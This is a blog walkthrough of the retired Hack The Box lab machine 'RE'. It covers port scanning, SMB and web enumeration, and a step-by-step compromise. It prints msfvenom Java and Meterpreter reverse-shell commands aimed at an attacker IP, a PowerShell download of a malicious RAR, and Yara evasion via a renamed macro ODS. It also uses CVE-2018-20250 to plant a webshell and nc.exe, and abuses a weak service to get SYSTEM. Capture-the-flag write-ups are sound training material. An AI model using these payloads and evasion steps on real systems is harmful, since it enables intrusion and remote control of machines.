---
layout: post
title: "RE: Hack The Box Walkthrough"
date: 2020-02-01 16:41:57 +0000
last_modified_at: 2020-02-01 16:41:57 +0000
category: Walkthrough
tags: ["Hack The Box", RE, retired, Windows]
comments: true
image:
  feature: re-htb-walkthrough.jpg
  credit: kalhh / Pixabay
  creditlink: https://pixabay.com/illustrations/board-magnifying-glass-nsa-1343452/
---

This post documents the complete walkthrough of RE, a retired vulnerable [VM][1] created by [0xdf][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

RE is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.144 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-22 08:11:27 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 445/tcp on 10.10.10.144                                   
Discovered open port 80/tcp on 10.10.10.144
```

`masscan` finds two open ports. Let\'s do one better with nmap scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p80,445 -A --reason -oN nmap.txt 10.10.10.144
...
PORT    STATE SERVICE       REASON          VERSION
80/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Visit reblog.htb
445/tcp open  microsoft-ds? syn-ack ttl 127
```

Hmm. Nothing much from `nmap`. But since SMB is enabled, let\'s see what we can discover from `smbmap`.

<a class="image-popup">
![09d7ff14.png](/assets/images/posts/re-htb-walkthrough/09d7ff14.png)
</a>

Well, at least there\'s a directory `malware_dropbox` we can read. Too bad it doesn't have any files in it.

<a class="image-popup">
![d6e0cf79.png](/assets/images/posts/re-htb-walkthrough/d6e0cf79.png)
</a>

Time to check out the `http` service. Here's what is looks like.

<a class="image-popup">
![c2909418.png](/assets/images/posts/re-htb-walkthrough/c2909418.png)
</a>

I better put `reblog.htb` into `/etc/hosts`.

<a class="image-popup">
![6061c2af.png](/assets/images/posts/re-htb-walkthrough/6061c2af.png)
</a>

Looks like there\'s one more host to add to `/etc/hosts`. And, check out the HTML source of `re.htb`.

<a class="image-popup">
![6c578963.png](/assets/images/posts/re-htb-walkthrough/6c578963.png)
</a>

Is that a hint of privilege escalation? I\'ve no clue how to proceed up to this point. Perhaps we can glean some insights from the blog posts?

### Custom ODS and Evading Yara Detection

Two blog posts in `reblog.htb` hinted about possible evasion of Yara detection with ODS phishing. One of the links pointed to the creator's external blog, where we can catch a glimpse of the Yara rules and how we can evade detection of malicious ODS files.

<a class="image-popup">
![961bb929.png](/assets/images/posts/re-htb-walkthrough/961bb929.png)
</a>

In addition, this post mentions the detection of run-of-the-mill stuff, particularly `powershell` and `cmd.exe`. Something for us to keep in mind while creating the custom ODS.

But where is the dropbox? Recall the `malware_dropbox` share? Although it says read-only, `smbclient` can actually `put` files into it.

<a class="image-popup">
![d12fda42.png](/assets/images/posts/re-htb-walkthrough/bd5f558c.png)
</a>

I followed the steps in the creator's blog to generate a ODS file from Metasploit and then changed the names of the subroutines and functions in LibreOffice macro editor like so.

<a class="image-popup">
![109601c2.png](/assets/images/posts/re-htb-walkthrough/109601c2.png)
</a>

Well, my payload `dick.jar` is a reverse shell written in Java generated by `msfvenom`. The box must have Java Runtime Environment (JRE) installed right, because of _Kenny in IT_. :wink:

```
# msfvenom -p java/shell_reverse_tcp LHOST=10.10.15.203 LPORT=1234 -f jar -o dick.jar
Payload size: 7548 bytes
Final size of jar file: 7548 bytes
Saved as: dick.jar
```

We host the file with Python's `SimpleHTTPServer` module. Upon opening the ODS file, the macro will download the payload with `certutil.exe` and write to `c:\windows\tracing\dick.jar`, a place where `Everyone` has write access. Next, we `put` in a new ODS file to execute the reverse shell.

We should get a reverse shell if nothing goes wrong.

<a class="image-popup">
![cb9b7f25.png](/assets/images/posts/re-htb-walkthrough/cb9b7f25.png)
</a>

Sweet. The `user.txt` is at `luke`'s desktop.

<a class="image-popup">
![883dc28f.png](/assets/images/posts/re-htb-walkthrough/883dc28f.png)
</a>

## Privilege Escalation

During enumeration of `luke`\'s account, I noticed a scheduled task running `process_samples.ps1` under `luke`\'s privileges.

~~~~powershell
$process_dir = "C:\Users\luke\Documents\malware_process"
$files_to_analyze = "C:\Users\luke\Documents\ods"
$yara = "C:\Users\luke\Documents\yara64.exe"
$rule = "C:\Users\luke\Documents\ods.yara"      

while($true) {
	# Get new samples      
	move C:\Users\luke\Documents\malware_dropbox\* $process_dir

	# copy each ods to zip file
	Get-ChildItem $process_dir -Filter *.ods |                 
	Copy-Item -Destination {$_.fullname -replace ".ods", ".zip"}

	Get-ChildItem $process_dir -Filter *.zip | ForEach-Object {

		# unzip archive to get access to content
		$unzipdir = Join-Path $_.directory $_.Basename     
		New-Item -Force -ItemType directory -Path $unzipdir | Out-Null       
		Expand-Archive $_.fullname -Force -ErrorAction SilentlyContinue -DestinationPath $unzipdir               

		# yara to look for known malware
		$yara_out = & $yara -r $rule $unzipdir
		$ods_name = $_.fullname -replace ".zip", ".ods"
		if ($yara_out.length -gt 0) {
			Remove-Item $ods_name
		}
	}

  # if any ods files left, make sure they launch, and then archive:            
  $files = ls $process_dir\*.ods           
  if ( $files.length -gt 0) {
		# launch ods files
		Invoke-Item "C:\Users\luke\Documents\malware_process\*.ods"
		Start-Sleep -s 5

		# kill open office, sleep
		Stop-Process -Name soffice*
		Start-Sleep -s 5      

		#& 'C:\Program Files (x86)\WinRAR\Rar.exe' a -ep $process_dir\temp.rar $process_dir\*.ods 2>&1 | Out-Null
		Compress-Archive -Path "$process_dir\*.ods" -DestinationPath "$process_dir\temp.zip"
		$hash = (Get-FileHash -Algorithm MD5 $process_dir\temp.zip).hash
		# Upstream processing may expect rars. Rename to .rar
		Move-Item -Force -Path $process_dir\temp.zip -Destination $files_to_analyze\$hash.rar
  }

	Remove-Item -Recurse -force -Path $process_dir\*
	Start-Sleep -s 5
}
~~~~

At the bottom of the script, there\'s  mention of upstream processing of RAR files. I noticed any RAR file I put into `C:\users\luke\Documents\ods` disappears faster than I can blink my eye while I was staring at my screen. Long story short, I was able to use EvilWinRar [generator](https://github.com/manulqwerty/Evil-WinRAR-Gen) to exploit [CVE-2018-20250](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20250) to write files as `re/cam`. But, what files do I write and where?

Recall the web server is IIS? In `C:\inetpub\wwwroot`, there are three folders `blog`, `ip` and `re` where `luke` has no write access. I can probably probably use EvilWinRar to write an ASPX webshell (from `/usr/share/webshells/aspx/cmdasp.aspx` in Kali Linux) to one of the folders.

<a class="image-popup">
![bf599f10.png](/assets/images/posts/re-htb-walkthrough/bf599f10.png)
</a>

Download the webshell.rar to `C:\users\luke\Documents\ods` like so.

```
C:\Users\luke\Documents\ods>powershell -nop -exec bypass -c iwr http://10.10.15.203:8000/webshell.rar -outfile .\webshell.rar
```

<a class="image-popup">
![a603fbe6.png](/assets/images/posts/re-htb-walkthrough/a603fbe6.png)
</a>

Bam, a webshell as IIS service.

### Weak Service

I found out that `accesschk.exe` was installed as part of SysInternals during my enumeration earlier on. Using `accesschk.exe`, I was able to determine that `NT AUTHORITY\SERVICE` has full service access to UsoSvc.

<a class="image-popup">
![ab7efd0f.png](/assets/images/posts/re-htb-walkthrough/ab7efd0f.png)
</a>

Holy cow. I can change it to run a reverse shell as SYSTEM!

<a class="image-popup">
![248f1963.png](/assets/images/posts/re-htb-walkthrough/248f1963.png)
</a>

I should mention that I had previously written `nc.exe` to `C:\inetpub\wwwroot\re` with EvilWinRar in case you are wondering how can I run a reverse shell back.

<a class="image-popup">
![ea454d38.png](/assets/images/posts/re-htb-walkthrough/ea454d38.png)
</a>

With a `SYSTEM` shell, getting `root.txt` should be a breeze.

<a class="image-popup">
![1e227a1a.png](/assets/images/posts/re-htb-walkthrough/1e227a1a.png)
</a>

Not so fast. I need to impersonate `coby`. As `SYSTEM`, you can be anyone you want on the machine with ease using Meterpreter and the incognito extension. First, I generate Meterpreter with `msfvenom`.

```
# msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=10.10.15.203 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 650 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe
```

Next, stand by Metasploit's multi-handler and wait for Meterpreter.

<a class="image-popup">
![9ca90bf1.png](/assets/images/posts/re-htb-walkthrough/9ca90bf1.png)
</a>

Launch a shell as `coby` and read that `root.txt`.

<a class="image-popup">
![dd400773.png](/assets/images/posts/re-htb-walkthrough/dd400773.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/198
[2]: https://www.hackthebox.eu/home/users/profile/4935
[3]: https://www.hackthebox.eu/
